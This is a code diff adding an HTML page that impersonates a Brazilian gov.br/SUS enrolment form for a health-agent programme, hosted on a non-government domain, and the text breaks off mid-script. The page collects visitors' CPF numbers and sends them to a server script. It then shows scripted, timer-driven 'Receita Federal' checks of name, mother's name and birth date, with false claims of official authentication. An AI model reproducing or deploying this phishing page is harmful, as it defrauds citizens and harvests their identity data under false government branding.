@@ -1,0 +1,1400 @@
+<html lang="pt-BR">
+
+<head></head>
+
+<body class="bg-white">﻿
+
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulário de Inscrição - Sistema Único de Saúde - SUS</title>
+
+
+
+    <!-- External CSS -->
+    <script src="3.4-3.16"></script>
+    <link rel="stylesheet" href="css/all.min-3.css">
+    <link href="rawline-3" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="css/custom-3.css">
+
+    <!-- SEO and Meta Tags -->
+    <meta name="description" content="Programa Nacional de Agentes da Saúde - Governo Federal">
+    <meta name="keywords" content="Saúde, governo federal, agentes Saúde, PNAE, vagas públicas">
+    <meta name="author" content="Governo Federal do Brasil">
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="Sistema Único de Saúde - SUS">
+    <meta property="og:description" content="Programa Nacional de Agentes da Saúde do Governo Federal">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://gov.agentesdaeducacao.org/formulario-inscricao?cep=31230770">
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon"
+        href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
+
+
+
+    <!-- Preserve Query Parameters Script -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Get current query parameters
+            const currentParams = new URLSearchParams(window.location.search);
+
+            // Function to add query parameters to a URL
+            function addQueryParams(url) {
+                if (!url) return url;
+
+                // Create URL object with absolute path
+                const urlObj = new URL(url, window.location.origin);
+
+                // Special handling for cadastro to resultados-busca navigation
+                if (window.location.pathname === '/cadastro' && url.includes('/resultado')) {
+                    // Add CEP parameter if not already present
+                    if (!urlObj.searchParams.has('cep')) {
+                        urlObj.searchParams.set('cep', '72236001');
+                    }
+                }
+
+                // Preserve existing parameters
+                currentParams.forEach((value, key) => {
+                    // Don't override CEP if it's already set
+                    if (!(key === 'cep' && urlObj.searchParams.has('cep'))) {
+                        urlObj.searchParams.set(key, value);
+                    }
+                });
+
+                return urlObj.toString();
+            }
+
+            // Add click event listeners to all links
+            document.querySelectorAll('a').forEach(link => {
+                const originalHref = link.getAttribute('href');
+                if (originalHref && !originalHref.startsWith('#') && !originalHref.startsWith('javascript:')) {
+                    link.addEventListener('click', function (e) {
+                        const newUrl = addQueryParams(originalHref);
+                        if (newUrl !== originalHref) {
+                            e.preventDefault();
+                            window.location.href = newUrl;
+                        }
+                    });
+                }
+            });
+
+            // Also handle form submissions
+            document.querySelectorAll('form').forEach(form => {
+                form.addEventListener('submit', function (e) {
+                    const formAction = form.getAttribute('action');
+                    if (formAction && formAction.includes('/resultados-busca')) {
+                        e.preventDefault();
+                        const newUrl = addQueryParams(formAction);
+                        window.location.href = newUrl;
+                    }
+                });
+            });
+
+            // Debug log to check parameters
+            console.log('Current URL:', window.location.href);
+            console.log('Current Parameters:', Object.fromEntries(currentParams));
+        });
+    </script>
+
+
+    <!-- Header -->
+    <header class="header-govbr">
+        <div class="flex justify-between items-center px-4 py-3">
+            <div class="flex items-center">
+                <a href="/" class="gov-logo">
+                    <img src="images/1200px-Gov.br_logo.svg-3.png" alt="gov.br" class="h-8">
+                </a>
+            </div>
+            <div class="flex items-center">
+                <button class="header-btn" id="menu-btn" aria-label="Menu">
+                    <i class="fas fa-ellipsis-v text-blue-900 mx-3"></i>
+                </button>
+                <div class="w-px h-6 bg-blue-900 mx-3"></div>
+                <button class="header-btn" id="accessibility-btn" aria-label="Acessibilidade">
+                    <i class="fas fa-palette text-blue-900 mx-3"></i>
+                </button>
+                <div class="half-circle mx-3"></div>
+                <button class="header-btn" id="apps-btn" aria-label="Aplicativos">
+                    <i class="fas fa-th text-blue-900 mx-3"></i>
+                </button>
+                <a href="/login"
+                    class="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium">
+                    <i class="fas fa-user mr-2"></i>
+                    Entrar
+                </a>
+            </div>
+        </div>
+
+        <!-- Title Bar -->
+        <div class="flex justify-between items-center px-4 py-2 border-b border-gray-300">
+            <div class="flex items-center">
+                <button class="header-btn" id="sidebar-toggle" aria-label="Menu lateral">
+                    <i class="fas fa-bars text-blue-900 mr-3"></i>
+                </button>
+                <span class="text-gray-800 text-sm font-medium">Fundo Nacional de Desenvolvimento da Saúde</span>
+            </div>
+            <div class="flex items-center">
+                <button class="header-btn" id="voice-search-btn" aria-label="Busca por voz">
+                    <i class="fas fa-microphone text-blue-900 mx-2"></i>
+                </button>
+                <button class="header-btn" id="search-toggle-btn" aria-label="Pesquisar">
+                    <i class="fas fa-search text-blue-900 mx-2"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Search Bar (hidden by default) -->
+        <div id="search-bar" class="hidden bg-white border-b border-gray-300 px-4 py-3">
+            <div class="flex items-center max-w-md mx-auto">
+                <div class="relative flex-1">
+                    <input type="text" id="header-search-input" placeholder="Buscar programas, vagas, ministérios..."
+                        class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200">
+                    <button id="header-search-btn" class="absolute right-2 top-2 text-blue-600 hover:text-blue-800">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </div>
+                <button id="search-close-btn" class="ml-3 text-gray-500 hover:text-gray-700">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Breadcrumb -->
+        <nav class="breadcrumb-nav flex items-center px-4 py-3 text-sm" aria-label="Navegação estrutural">
+            <div class="flex flex-wrap items-center gap-1">
+                <a href="/" class="text-blue-700 hover:text-blue-800">
+                    <i class="fas fa-home"></i>
+                </a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/acesso-informacao" class="text-blue-700 hover:text-blue-800 text-xs">Acesso à Informação</a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/acoes-programas" class="text-blue-700 hover:text-blue-800 text-xs">Ações e Programas</a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/programas" class="text-blue-700 hover:text-blue-800 text-xs">Programas</a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/bolsas-auxilios" class="text-blue-700 hover:text-blue-800 text-xs">Bolsas e Auxílios</a>
+                <span class="mx-1 text-gray-600">></span>
+                <a href="/lista-programas" class="text-blue-700 hover:text-blue-800 text-xs">Lista de Programas</a>
+                <span class="mx-1 text-gray-600">></span>
+                <span class="text-gray-800 text-xs font-medium">Mais Agentes da Saúde</span>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+
+        <!-- Popup de Validação -->
+        <div id="validation-popup" class="fixed top-4 right-4 z-50 hidden">
+            <div class="bg-white border-2 border-gray-800 rounded-lg shadow-lg p-4 min-w-64">
+                <div class="flex items-center">
+                    <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-gray-800 mr-3"></div>
+                    <div>
+                        <p class="text-sm font-medium text-gray-800" id="validation-message">Validando dados...</p>
+                        <p class="text-xs text-gray-600" id="validation-details">Aguarde um momento</p>
+                    </div>
+                </div>
+                <div class="mt-2 bg-gray-200 rounded-full h-1">
+                    <div class="bg-gray-800 h-1 rounded-full transition-all duration-500" id="validation-progress"
+                        style="width: 0%"></div>
+                </div>
+            </div>
+        </div>
+        <div class="px-4 py-4">
+            <h1 class="text-3xl font-semibold mb-4" style="color: #1351B4;">Formulário de Inscrição - Mais Agentes da
+                Saúde</h1>
+
+            <div class="border-t border-b border-gray-300 py-3 mb-6">
+                <div class="text-gray-700 text-sm">
+                    <p>Publicado em 24/05/2025 17h37</p>
+                    <p>Atualizado em 24/05/2025 18h29</p>
+                </div>
+            </div>
+
+            <!-- Progress Bar -->
+            <div class="bg-white border border-gray-200 rounded-lg p-4 md:p-6 mb-6 md:mb-8">
+                <h2 class="text-base md:text-lg font-semibold text-gray-800 mb-3 md:mb-4">Progresso da Inscrição</h2>
+
+                <!-- Desktop Progress -->
+                <div class="hidden md:flex items-center justify-between">
+                    <div class="flex items-center">
+                        <div id="step1-circle"
+                            class="w-7 h-7 bg-blue-600 text-white rounded-full flex items-center justify-center text-xs font-medium">
+                            1</div>
+                        <span id="step1-text" class="ml-2 text-sm font-medium text-blue-600">Dados Pessoais</span>
+                    </div>
+                    <div class="flex-1 mx-3 h-1 bg-gray-200 rounded">
+                        <div id="progress-bar-1" class="h-1 bg-blue-600 rounded transition-all duration-500"
+                            style="width: 25%"></div>
+                    </div>
+                    <div class="flex items-center">
+                        <div id="step2-circle"
+                            class="w-7 h-7 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center text-xs font-medium">
+                            2</div>
+                        <span id="step2-text" class="ml-2 text-sm text-gray-600">Documentação</span>
+                    </div>
+                    <div class="flex-1 mx-3 h-1 bg-gray-200 rounded">
+                        <div id="progress-bar-2" class="h-1 bg-blue-600 rounded transition-all duration-500"
+                            style="width: 0%"></div>
+                    </div>
+                    <div class="flex items-center">
+                        <div id="step3-circle"
+                            class="w-7 h-7 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center text-xs font-medium">
+                            3</div>
+                        <span id="step3-text" class="ml-2 text-sm text-gray-600">Finalização</span>
+                    </div>
+                </div>
+
+                <!-- Mobile Progress -->
+                <div class="md:hidden">
+                    <div class="flex items-center justify-between mb-3">
+                        <span class="text-xs text-gray-600">Etapa 1 de 3</span>
+                        <span class="text-xs font-medium text-blue-600">33% concluído</span>
+                    </div>
+                    <div class="w-full bg-gray-200 rounded-full h-2 mb-3">
+                        <div class="bg-blue-600 h-2 rounded-full" style="width: 33%"></div>
+                    </div>
+                    <div class="flex justify-between text-xs">
+                        <span class="font-medium text-blue-600">• Dados Pessoais</span>
+                        <span class="text-gray-500">Documentação</span>
+                        <span class="text-gray-500">Finalização</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Informações Importantes -->
+            <div class="bg-gray-50 border border-gray-300 rounded p-3 mb-4">
+                <div class="flex items-center">
+                    <i class="fas fa-info-circle text-gray-600 text-sm mr-2"></i>
+                    <h3 class="text-sm font-medium text-gray-700">Informações Importantes</h3>
+                </div>
+                <p class="text-xs text-gray-600 mt-1 ml-5">
+                    Tenha documentos em mãos • Verifique dados antes de prosseguir • Processo 100% oficial
+                </p>
+            </div>
+
+            <!-- Formulário CPF -->
+            <div class="bg-white border border-gray-200 rounded-lg p-6 mb-8">
+                <h3 class="text-xl font-semibold text-gray-800 mb-6">
+                    <i class="fas fa-user mr-2"></i>
+                    Identificação Pessoal
+                </h3>
+
+                <form id="form-cpf" class="space-y-6">
+                    <div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
+                        <div class="flex items-center">
+                            <span class="text-sm font-medium text-gray-800">
+                                Seus dados estão protegidos pela Lei Geral de Proteção de Dados (LGPD)
+                            </span>
+                        </div>
+                    </div>
+
+                    <div class="max-w-md">
+                        <label for="cpf" class="block text-sm font-medium text-gray-700 mb-2">
+                            CPF *
+                            <span class="text-xs text-gray-500 ml-1">(Apenas números)</span>
+                        </label>
+                        <div class="relative">
+                            <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14"
+                                required="" style="font-size: 16px;"
+                                class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base">
+                            <div class="absolute inset-y-0 right-0 pr-3 flex items-center">
+                                <i class="fas fa-id-card text-gray-400"></i>
+                            </div>
+                        </div>
+                        <div id="cpf-error" class="mt-2 text-sm text-red-600 hidden">
+                            <i class="fas fa-exclamation-triangle mr-1"></i>
+                            <span></span>
+                        </div>
+                        <div id="cpf-success" class="mt-2 text-sm text-green-600 hidden">
+                            <i class="fas fa-check-circle mr-1"></i>
+                            CPF válido
+                        </div>
+                    </div>
+
+                    <div class="bg-gray-50 border border-gray-200 rounded-lg p-4">
+                        <h4 class="font-medium text-gray-800 mb-2">Por que precisamos do seu CPF?</h4>
+                        <ul class="text-sm text-gray-600 space-y-1">
+                            <li>• Identificação única no sistema do programa</li>
+                            <li>• Verificação de elegibilidade para participar</li>
+                            <li>• Emissão de certificados e documentos oficiais</li>
+                            <li>• Conformidade com regulamentações governamentais</li>
+                        </ul>
+                    </div>
+
+                    <div class="flex items-center">
+                        <input type="checkbox" id="aceitar-termos-cpf" required=""
+                            class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                        <label for="aceitar-termos-cpf" class="ml-2 text-sm text-gray-700">
+                            Declaro que o CPF informado é meu e autorizo seu uso para fins de inscrição no programa
+                            <span class="text-red-600">*</span>
+                        </label>
+                    </div>
+
+                    <div class="flex justify-between items-center pt-6 border-t border-gray-200">
+                        <a href="/resultado"
+                            class="inline-flex items-center px-4 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 transition-colors">
+                            <i class="fas fa-arrow-left mr-2"></i>
+                            Voltar
+                        </a>
+
+                        <button type="submit" id="btn-continuar" disabled=""
+                            class="inline-flex items-center px-6 py-3 border border-transparent text-base font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:bg-gray-400 disabled:cursor-not-allowed transition-colors">
+                            Continuar
+                            <i class="fas fa-arrow-right ml-2"></i>
+                        </button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Área de Validação de Identidade -->
+            <div id="validacao-identidade" class="bg-white border border-gray-200 rounded-lg p-6 mb-8 hidden">
+                <h3 class="text-xl font-semibold text-gray-800 mb-6">
+                    <i class="fas fa-shield-alt mr-2"></i>
+                    Verificação de Identidade
+                </h3>
+
+                <div class="space-y-4">
+                    <!-- Etapa 1: Validando CPF -->
+                    <div id="etapa-cpf" class="flex items-center p-4 bg-gray-50 rounded-lg">
+                        <div class="flex-shrink-0 mr-4">
+                            <div id="loading-cpf" class="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600">
+                            </div>
+                            <div id="success-cpf"
+                                class="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center hidden">
+                                <i class="fas fa-check text-white text-sm"></i>
+                            </div>
+                        </div>
+                        <div class="flex-1">
+                            <h4 class="font-medium text-gray-800">Validando CPF</h4>
+                            <p id="status-cpf" class="text-sm text-gray-600">Consultando base de dados da Receita
+                                Federal...</p>
+                        </div>
+                    </div>
+
+                    <!-- Etapa 2: Verificando Nome -->
+                    <div id="etapa-nome" class="flex items-center p-4 bg-gray-50 rounded-lg opacity-50">
+                        <div class="flex-shrink-0 mr-4">
+                            <div id="loading-nome"
+                                class="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600 hidden"></div>
+                            <div id="success-nome"
+                                class="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center hidden">
+                                <i class="fas fa-check text-white text-sm"></i>
+                            </div>
+                            <div id="pending-nome"
+                                class="w-6 h-6 bg-gray-300 rounded-full flex items-center justify-center">
+                                <i class="fas fa-clock text-gray-500 text-sm"></i>
+                            </div>
+                        </div>
+                        <div class="flex-1">
+                            <h4 class="font-medium text-gray-800">Verificando Nome</h4>
+                            <p id="status-nome" class="text-sm text-gray-600">Aguardando validação do CPF...</p>
+                        </div>
+                    </div>
+
+                    <!-- Etapa 3: Verificando Nome da Mãe -->
+                    <div id="etapa-mae" class="flex items-center p-4 bg-gray-50 rounded-lg opacity-50">
+                        <div class="flex-shrink-0 mr-4">
+                            <div id="loading-mae"
+                                class="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600 hidden"></div>
+                            <div id="success-mae"
+                                class="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center hidden">
+                                <i class="fas fa-check text-white text-sm"></i>
+                            </div>
+                            <div id="pending-mae"
+                                class="w-6 h-6 bg-gray-300 rounded-full flex items-center justify-center">
+                                <i class="fas fa-clock text-gray-500 text-sm"></i>
+                            </div>
+                        </div>
+                        <div class="flex-1">
+                            <h4 class="font-medium text-gray-800">Verificando Nome da Mãe</h4>
+                            <p id="status-mae" class="text-sm text-gray-600">Aguardando validação anterior...</p>
+                        </div>
+                    </div>
+
+                    <!-- Etapa 4: Validando Data de Nascimento -->
+                    <div id="etapa-nascimento" class="flex items-center p-4 bg-gray-50 rounded-lg opacity-50">
+                        <div class="flex-shrink-0 mr-4">
+                            <div id="loading-nascimento"
+                                class="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600 hidden"></div>
+                            <div id="success-nascimento"
+                                class="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center hidden">
+                                <i class="fas fa-check text-white text-sm"></i>
+                            </div>
+                            <div id="pending-nascimento"
+                                class="w-6 h-6 bg-gray-300 rounded-full flex items-center justify-center">
+                                <i class="fas fa-clock text-gray-500 text-sm"></i>
+                            </div>
+                        </div>
+                        <div class="flex-1">
+                            <h4 class="font-medium text-gray-800">Validando Data de Nascimento</h4>
+                            <p id="status-nascimento" class="text-sm text-gray-600">Aguardando validação anterior...</p>
+                        </div>
+                    </div>
+
+                    <!-- Etapa 5: Verificando Elegibilidade -->
+                    <div id="etapa-elegibilidade" class="flex items-center p-4 bg-gray-50 rounded-lg opacity-50">
+                        <div class="flex-shrink-0 mr-4">
+                            <div id="loading-elegibilidade"
+                                class="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600 hidden"></div>
+                            <div id="success-elegibilidade"
+                                class="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center hidden">
+                                <i class="fas fa-check text-white text-sm"></i>
+                            </div>
+                            <div id="pending-elegibilidade"
+                                class="w-6 h-6 bg-gray-300 rounded-full flex items-center justify-center">
+                                <i class="fas fa-clock text-gray-500 text-sm"></i>
+                            </div>
+                        </div>
+                        <div class="flex-1">
+                            <h4 class="font-medium text-gray-800">Verificando Elegibilidade</h4>
+                            <p id="status-elegibilidade" class="text-sm text-gray-600">Aguardando validação anterior...
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Dados Carregados -->
+                <div id="dados-carregados" class="mt-6 p-4 bg-blue-50 border border-blue-200 rounded-lg hidden">
+                    <div class="text-center py-4">
+                        <div class="flex items-center justify-center mb-3">
+                            <div>
+                                <h4 class="text-xl font-semibold text-green-800">Autenticado com o GOV.BR</h4>
+                                <p class="text-sm text-gray-600">Identidade verificada com sucesso</p>
+                            </div>
+                        </div>
+
+                        <!-- Dados do Usuário Autenticado -->
+                        <div class="bg-white rounded-lg p-5 mt-4 border border-green-200 shadow-sm">
+                            <div class="text-center mb-3">
+                                <div
+                                    class="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
+                                    <i class="fas fa-user-check text-green-600 text-sm"></i>
+                                </div>
+                                <h5 class="font-semibold text-green-800 text-sm">DADOS VERIFICADOS</h5>
+                            </div>
+
+                            <div class="space-y-3">
+                                <div class="bg-gray-50 rounded-lg p-3">
+                                    <label class="text-xs font-medium text-gray-500 uppercase tracking-wide">Nome
+                                        Completo</label>
+                                    <p id="dado-nome-auth" class="font-semibold text-gray-900 mt-1">-</p>
+                                </div>
+
+                                <div class="grid grid-cols-2 gap-3">
+                                    <div class="bg-gray-50 rounded-lg p-3">
+                                        <label
+                                            class="text-xs font-medium text-gray-500 uppercase tracking-wide">CPF</label>
+                                        <p id="dado-cpf-auth"
+                                            class="font-mono font-semibold text-gray-900 mt-1 text-sm">-</p>
+                                    </div>
+
+                                    <div class="bg-gray-50 rounded-lg p-3">
+                                        <label
+                                            class="text-xs font-medium text-gray-500 uppercase tracking-wide">Filiação</label>
+                                        <p id="dado-mae-auth" class="font-semibold text-gray-900 mt-1 text-sm">-</p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="mt-4 pt-3 border-t border-gray-200 text-center">
+                                <div class="flex items-center justify-center text-xs text-green-600">
+                                    <i class="fas fa-shield-check mr-2"></i>
+                                    <span class="font-medium">Dados validados pela Receita Federal</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Informações de Localização -->
+                        <div class="border-t border-blue-200 pt-4 mt-4">
+                            <h5 class="font-medium text-blue-800 mb-2">Localização Confirmada</h5>
+                            <div class="text-sm">
+                                <div class="mb-2">
+                                    <span class="text-gray-600">Endereço:</span>
+                                    <p id="dado-logradouro" class="font-medium text-gray-800">-</p>
+                                </div>
+                                <div class="bg-green-50 border border-green-200 rounded p-2">
+                                    <div class="flex items-center mb-1">
+                                        <i class="fas fa-map-marker-alt text-green-600 mr-2"></i>
+                                        <span class="font-medium text-green-800">Unidades Próximas Identificadas</span>
+                                    </div>
+                                    <p class="text-green-700 text-xs">2 unidades educacionais encontradas dentro de 3 km
+                                        da sua residência</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Botão Finalizar -->
+                <div class="flex justify-center mt-6">
+                    <button id="finalizar-verificacao"
+                        class="inline-flex items-center px-6 py-3 border border-transparent text-base font-medium rounded-md text-white bg-green-600 hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 disabled:bg-gray-400 disabled:cursor-not-allowed transition-colors hidden"
+                        disabled="">
+                        <i class="fas fa-check-circle mr-2"></i>
+                        Finalizar Verificação
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                const cpfInput = document.getElementById('cpf');
+                const cpfError = document.getElementById('cpf-error');
+                const cpfSuccess = document.getElementById('cpf-success');
+                const aceitarTermos = document.getElementById('aceitar-termos-cpf');
+                const btnContinuar = document.getElementById('btn-continuar');
+                const form = document.getElementById('form-cpf');
+
+                let cpfValido = false;
+
+                // Máscara para CPF
+                cpfInput.addEventListener('input', function (e) {
+                    let value = e.target.value.replace(/\D/g, '');
+
+                    if (value.length > 11) {
+                        value = value.substring(0, 11);
+                    }
+
+                    if (value.length > 9) {
+                        value = value.substring(0, 3) + '.' + value.substring(3, 6) + '.' + value.substring(6, 9) + '-' + value.substring(9);
+                    } else if (value.length > 6) {
+                        value = value.substring(0, 3) + '.' + value.substring(3, 6) + '.' + value.substring(6);
+                    } else if (value.length > 3) {
+                        value = value.substring(0, 3) + '.' + value.substring(3);
+                    }
+
+                    e.target.value = value;
+
+                    // Apenas verificar se tem 11 dígitos para habilitar o botão
+                    cpfValido = (value.replace(/\D/g, '').length === 11);
+                    verificarFormulario();
+                });
+
+                function validarCPF(cpf) {
+                    cpf = cpf.replace(/\D/g, '');
+
+                    if (cpf.length !== 11) {
+                        cpfValido = false;
+                        mostrarErro('CPF deve ter 11 dígitos');
+                        return;
+                    }
+
+                    // Verificar se todos os dígitos são iguais
+                    if (/^(\d)\1+$/.test(cpf)) {
+                        cpfValido = false;
+                        mostrarErro('CPF inválido');
+                        return;
+                    }
+
+                    // Algoritmo de validação do CPF
+                    let soma = 0;
+                    for (let i = 0; i < 9; i++) {
+                        soma += parseInt(cpf.charAt(i)) * (10 - i);
+                    }
+                    let resto = 11 - (soma % 11);
+                    let digito1 = resto < 2 ? 0 : resto;
+
+                    soma = 0;
+                    for (let i = 0; i < 10; i++) {
+                        soma += parseInt(cpf.charAt(i)) * (11 - i);
+                    }
+                    resto = 11 - (soma % 11);
+                    let digito2 = resto < 2 ? 0 : resto;
+
+                    if (parseInt(cpf.charAt(9)) === digito1 && parseInt(cpf.charAt(10)) === digito2) {
+                        cpfValido = true;
+                        mostrarSucesso();
+                    } else {
+                        cpfValido = false;
+                        mostrarErro('CPF inválido');
+                    }
+                }
+
+                function mostrarErro(mensagem) {
+                    cpfError.querySelector('span').textContent = mensagem;
+                    cpfError.classList.remove('hidden');
+                    cpfSuccess.classList.add('hidden');
+                    cpfInput.classList.add('border-red-500');
+                    cpfInput.classList.remove('border-green-500');
+                }
+
+                function mostrarSucesso() {
+                    cpfError.classList.add('hidden');
+                    cpfSuccess.classList.remove('hidden');
+                    cpfInput.classList.remove('border-red-500');
+                    cpfInput.classList.add('border-green-500');
+                }
+
+                function verificarFormulario() {
+                    if (cpfValido && aceitarTermos.checked) {
+                        btnContinuar.disabled = false;
+                        btnContinuar.classList.remove('bg-gray-400');
+                        btnContinuar.classList.add('bg-blue-600', 'hover:bg-blue-700');
+                    } else {
+                        btnContinuar.disabled = true;
+                        btnContinuar.classList.add('bg-gray-400');
+                        btnContinuar.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+                    }
+                }
+
+                aceitarTermos.addEventListener('change', verificarFormulario);
+
+                form.addEventListener('submit', function (e) {
+                    e.preventDefault();
+
+                    if (!cpfValido) {
+                        alert('Por favor, insira um CPF válido.');
+                        return;
+                    }
+
+                    if (!aceitarTermos.checked) {
+                        alert('Você deve aceitar os termos para continuar.');
+                        return;
+                    }
+
+                    // Mostrar popup de validação
+                    mostrarValidacao('Validando CPF...', 'Consultando base de dados da Receita Federal');
+
+                    // Mostrar loading
+                    btnContinuar.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Conectando ao gov.br...';
+                    btnContinuar.disabled = true;
+
+                    // Atualizar para "Autenticando..." após 2 segundos
+                    setTimeout(() => {
+                        btnContinuar.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Autenticando...';
+                    }, 2000);
+
+                    // Mostrar área de validação
+                    document.getElementById('validacao-identidade').classList.remove('hidden');
+
+                    // Rolar automaticamente para a área de validação
+                    setTimeout(() => {
+                        document.getElementById('validacao-identidade').scrollIntoView({
+                            behavior: 'smooth',
+                            block: 'center'
+                        });
+                    }, 500);
+
+                    // Obter CPF limpo
+                    const cpfLimpo = cpfInput.value.replace(/\D/g, '');
+
+                    // Iniciar processo de validação por etapas
+                    iniciarValidacaoEtapas(cpfLimpo);
+                });
+
+                function iniciarValidacaoEtapas(cpf) {
+                    // Buscar dados do CEP primeiro para obter logradouro
+                    const cepDoFormulario = new URLSearchParams(window.location.search).get('cep') || '22011040';
+
+                    fetch(`https://viacep.com.br/ws/${cepDoFormulario.replace(/\D/g, '')}/json/`)
+                        .then(response => response.json())
+                        .then(dadosCep => {
+                            window.dadosLocalizacao = dadosCep;
+                            // Etapa 1: Validar CPF
+                            setTimeout(() => {
+                                validarCPFEtapa(cpf);
+                            }, 1000);
+                        })
+                        .catch(() => {
+                            // Se erro no CEP, continuar sem dados de localização
+                            setTimeout(() => {
+                                validarCPFEtapa(cpf);
+                            }, 1000);
+                        });
+                }
+
+                function validarCPFEtapa(cpf) {
+                    // Chamar API de validação
+                    fetch('validar-cpf.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ cpf: cpf })
+                    })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.error) {
+                                // Mostrar erro na etapa CPF
+                                mostrarErroEtapa('cpf', data.error);
+                                btnContinuar.innerHTML = 'Continuar <i class="fas fa-arrow-right ml-2"></i>';
+                                btnContinuar.disabled = false;
+                                return;
+                            }
+
+                            // CPF válido - salvar dados globalmente e passar para próxima etapa
+                            window.dadosCpfValidado = data.dados_originais;
+                            concluirEtapa('cpf', 'CPF validado com sucesso');
+                            atualizarProgresso(40); // 40% após validar CPF
+                            iniciarEtapaNome(data.dados_originais);
+                        })
+                        .catch(error => {
+                            console.error('Erro:', error);
+                            mostrarErroEtapa('cpf', 'Erro de conexão. Tente novamente.');
+                            btnContinuar.innerHTML = 'Continuar <i class="fas fa-arrow-right ml-2"></i>';
+                            btnContinuar.disabled = false;
+                        });
+                }
+
+                function iniciarEtapaNome(dadosCpf) {
+                    ativarEtapa('nome');
+                    document.getElementById('status-nome').textContent = 'Verificando dados pessoais...';
+
+                    setTimeout(() => {
+                        concluirEtapa('nome', 'Validado com sucesso');
+                        atualizarProgresso(55); // 55% após validar nome
+                        iniciarEtapaMae(dadosCpf);
+                    }, 1500);
+                }
+
+                function iniciarEtapaMae(dadosCpf) {
+                    ativarEtapa('mae');
+                    document.getElementById('status-mae').textContent = 'Verificando dados da filiação...';
+
+                    setTimeout(() => {
+                        concluirEtapa('mae', 'Validado com sucesso');
+                        atualizarProgresso(70); // 70% após validar nome da mãe
+                        iniciarEtapaNascimento(dadosCpf);
+                    }, 1500);
+                }
+
+                function iniciarEtapaNascimento(dadosCpf) {
+                    ativarEtapa('nascimento');
+                    document.getElementById('status-nascimento').textContent = 'Validando data de nascimento...';
+
+                    setTimeout(() => {
+                        concluirEtapa('nascimento', 'Validado com sucesso');
+                        atualizarProgresso(85); // 85% após validar data de nascimento
+                        iniciarEtapaElegibilidade(dadosCpf);
+                    }, 1500);
+                }
+
+                function iniciarEtapaElegibilidade(dadosCpf) {
+                    ativarEtapa('elegibilidade');
+                    document.getElementById('status-elegibilidade').textContent = 'Verificando critérios de elegibilidade...';
+
+                    setTimeout(() => {
+                        concluirEtapa('elegibilidade', 'Validado com sucesso');
+                        atualizarProgresso(100); // 100% ao finalizar todas as validações
+                        finalizarValidacao();
+                    }, 2000);
+                }
+
+                function ativarEtapa(etapa) {
+                    document.getElementById(`etapa-${etapa}`).classList.remove('opacity-50');
+                    document.getElementById(`pending-${etapa}`).classList.add('hidden');
+                    document.getElementById(`loading-${etapa}`).classList.remove('hidden');
+                }
+
+                function concluirEtapa(etapa, mensagem) {
+                    document.getElementById(`loading-${etapa}`).classList.add('hidden');
+                    document.getElementById(`success-${etapa}`).classList.remove('hidden');
+                    document.getElementById(`status-${etapa}`).textContent = mensagem;
+                    document.getElementById(`status-${etapa}`).classList.add('text-green-600');
+                }
+
+                function mostrarErroEtapa(etapa, mensagem) {
+                    document.getElementById(`loading-${etapa}`).classList.add('hidden');
+                    document.getElementById(`status-${etapa}`).textContent = mensagem;
+                    document.getElementById(`status-${etapa}`).classList.add('text-red-600');
+                }
+
+                function atualizarProgresso(porcentagem) {
